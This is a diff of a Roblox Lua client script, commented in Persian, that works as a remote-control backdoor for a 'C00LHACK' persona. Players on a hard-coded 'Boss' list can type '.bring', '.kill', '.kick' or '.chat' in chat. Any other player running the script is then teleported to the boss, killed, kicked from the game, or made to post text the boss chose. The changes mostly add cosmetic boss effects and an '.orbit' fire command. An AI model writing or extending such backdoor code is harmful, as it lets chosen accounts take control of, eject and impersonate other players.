@@ -1,19 +1,92 @@
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 
 local Bosses = {
     "C00LH4CK1124",
-    "Ssukuna_robloxx", 
-    "C00LGAME1412"
+    "Ssukuna_robloxx"
 }
 
+-- تابع اعمال افکت‌ها، صدا و بیلبورد روی رئیس
+local function applyBossEffects(character)
+    if not character then return end
+    
+    local head = character:WaitForChild("Head", 5)
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
+    if not head or not humanoidRootPart then return end
+
+    -- ۱. ساخت BillboardGui برای متن REAL C00LHACK بالای سر
+    if not head:FindFirstChild("BossBillboard") then
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "BossBillboard"
+        billboard.Size = UDim2.new(0, 250, 0, 60)
+        billboard.StudsOffset = Vector3.new(0, 3, 0)
+        billboard.AlwaysOnTop = true
+        billboard.Parent = head
+
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Name = "BossText"
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "REAL C00LHACK"
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.TextStrokeTransparency = 0 
+        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        textLabel.Parent = billboard
+    end
+
+    -- ۲. پخش آهنگ روی سر رئیس
+    if not head:FindFirstChild("BossSound") then
+        local sound = Instance.new("Sound")
+        sound.Name = "BossSound"
+        sound.SoundId = "rbxassetid://139488665764275"
+        sound.Looped = true
+        sound.Volume = 1.1
+        sound.Pitch = 1.1
+        sound.Playing = true
+        sound.Parent = head
+    end
+
+    -- ۳. نور بنفش دور رئیس (با Range متناسب)
+    if not humanoidRootPart:FindFirstChild("BossLight") then
+        local light = Instance.new("PointLight")
+        light.Name = "BossLight"
+        light.Color = Color3.fromRGB(148, 0, 211)
+        light.Range = 10
+        light.Brightness = 4
+        light.Parent = humanoidRootPart
+    end
+
+    -- ۴. افکت آتش روی دست‌ها
+    local handNames = {"LeftHand", "RightHand", "Left Arm", "Right Arm"}
+    for _, name in ipairs(handNames) do
+        local hand = character:FindFirstChild(name)
+        if hand and not hand:FindFirstChild("BossAttachment") then
+            local attachment = Instance.new("Attachment")
+            attachment.Name = "BossAttachment"
+            attachment.Position = Vector3.new(0, -0.6, 0)
+            attachment.Parent = hand
+
+            local fire = Instance.new("Fire")
+            fire.Name = "BossFire"
+            fire.Size = 5
+            fire.Heat = 12
+            fire.Color = Color3.fromRGB(255, 100, 0)
+            fire.SecondaryColor = Color3.fromRGB(255, 0, 0)
+            fire.Parent = attachment
+        end
+    end
+end
+
+-- مدیریت چت رئیس‌ها (شامل دستور .orbit پشتیبانی‌کننده از Speed و Radius)
 local function onBossChatted(speaker, message)
     local args = string.split(message, " ")
     local cmd = string.lower(args[1]) 
-    
+
     if cmd == ".bring" and args[2] == "users" then
         if not table.find(Bosses, LocalPlayer.Name) then
             if speaker and speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
@@ -22,19 +95,19 @@ local function onBossChatted(speaker, message)
                 end
             end
         end
-        
+
     elseif cmd == ".kill" and args[2] == "users" then
         if not table.find(Bosses, LocalPlayer.Name) then
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                 LocalPlayer.Character.Humanoid.Health = 0
             end
         end
-        
+
     elseif cmd == ".kick" and args[2] == "users" then
         if not table.find(Bosses, LocalPlayer.Name) then
             LocalPlayer:Kick("You have been kicked by the C00LHACK.")
         end
-        
+
     elseif cmd == ".chat" and args[2] == "users" then
         local textToSay = string.sub(message, 13)
         if textToSay ~= "" and not table.find(Bosses, LocalPlayer.Name) then
@@ -44,6 +117,51 @@ local function onBossChatted(speaker, message)
                 ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(textToSay, "All")
             end
         end
+
+    -- دستور .orbit [سرعت] [شعاع]
+    elseif cmd == ".orbit" then
+        if speaker and speaker.Character then
+            local char = speaker.Character
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local speed = tonumber(args[2]) or 2    -- مقدار سرعت (پیش‌فرض 2)
+                local radius = tonumber(args[3]) or 3.5  -- مقدار شعاع (پیش‌فرض 3.5)
+
+                -- حذف مدل قبلی در صورت وجود
+                local existing = char:FindFirstChild("OrbitFiresModel")
+                if existing then existing:Destroy() end
+
+                local model = Instance.new("Model")
+                model.Name = "OrbitFiresModel"
+                model.Parent = char
+                model:SetAttribute("Speed", speed)
+                model:SetAttribute("Radius", radius)
+
+                -- ساخت 4 آتش چرخان دور رئیس
+                for i = 1, 4 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(0.2, 0.2, 0.2)
+                    part.Transparency = 1
+                    part.CanCollide = false
+                    part.Anchored = true
+                    part.Parent = model
+
+                    local fire = Instance.new("Fire")
+                    fire.Size = 5
+                    fire.Heat = 9
+                    fire.Color = Color3.fromRGB(255, 100, 0)
+                    fire.Parent = part
+                end
+            end
+        end
+
+    -- دستور .unorbit برای غیرفعال کردن
+    elseif cmd == ".unorbit" then
+        if speaker and speaker.Character then
+            local char = speaker.Character
+            local existing = char:FindFirstChild("OrbitFiresModel")
+            if existing then existing:Destroy() end
+        end
     end
 end
 
@@ -52,6 +170,17 @@ local function checkPlayer(player)
         player.Chatted:Connect(function(message)
             onBossChatted(player, message)
         end)
+        
+        player.CharacterAdded:Connect(function(character)
+            task.wait(1)
+            applyBossEffects(character)
+        end)
+
+        if player.Character then
+            task.spawn(function()
+                applyBossEffects(player.Character)
+            end)
+        end
     end
 end
 
@@ -60,3 +189,74 @@ for _, player in ipairs(Players:GetPlayers()) do
 end
 
 Players.PlayerAdded:Connect(checkPlayer)
+
+-- لوپ اصلی برای چرخش آتش‌ها، رنگ RGB و محو شدن متن با فاصله
+RunService.RenderStepped:Connect(function()
+    local localChar = LocalPlayer.Character
+    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
+    
+    local t = tick() * 3
+    local rgbColor = Color3.fromHSV((t % 5) / 5, 1, 1)
+
+    local minFadeDistance = 30 
+    local maxDistance = 60     
+
+    for _, bossName in ipairs(Bosses) do
+        local player = Players:FindFirstChild(bossName)
+        if player and player.Character then
+            local char = player.Character
+            local head = char:FindFirstChild("Head")
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            
+            -- بروزرسانی چرخش آتش‌ها با محاسبه سرعت و شعاع اختصاصی
+            local orbitModel = char:FindFirstChild("OrbitFiresModel")
+            if hrp and orbitModel then
+                local speed = orbitModel:GetAttribute("Speed") or 2
+                local radius = orbitModel:GetAttribute("Radius") or 3.5
+                local timeVal = tick() * speed
+                local children = orbitModel:GetChildren()
+                
+                for i, part in ipairs(children) do
+                    if part:IsA("BasePart") then
+                        local angle = timeVal + (i * (math.pi / 2))
+                        local x = math.cos(angle) * radius
+                        local z = math.sin(angle) * radius
+                        part.CFrame = hrp.CFrame * CFrame.new(x, -1, z)
+                    end
+                end
+            end
+
+            if head then
+                local billboard = head:FindFirstChild("BossBillboard")
+                if billboard then
+                    local textLabel = billboard:FindFirstChild("BossText")
+                    if textLabel then
+                        textLabel.TextColor3 = rgbColor
+                        
+                        -- محو شدن نرم با فاصله
+                        if localHRP and hrp then
+                            local distance = (localHRP.Position - hrp.Position).Magnitude
+                            
+                            if distance <= minFadeDistance then
+                                textLabel.TextTransparency = 0
+                                textLabel.TextStrokeTransparency = 0
+                            elseif distance >= maxDistance then
+                                textLabel.TextTransparency = 1
+                                textLabel.TextStrokeTransparency = 1
+                            else
+                                local alpha = (distance - minFadeDistance) / (maxDistance - minFadeDistance)
+                                textLabel.TextTransparency = alpha
+                                textLabel.TextStrokeTransparency = alpha
+                            end
+                        else
+                            textLabel.TextTransparency = 0
+                            textLabel.TextStrokeTransparency = 0
+                        end
+                    end
+                else
+                    applyBossEffects(char)
+                end
+            end
+        end
+    end
+end)
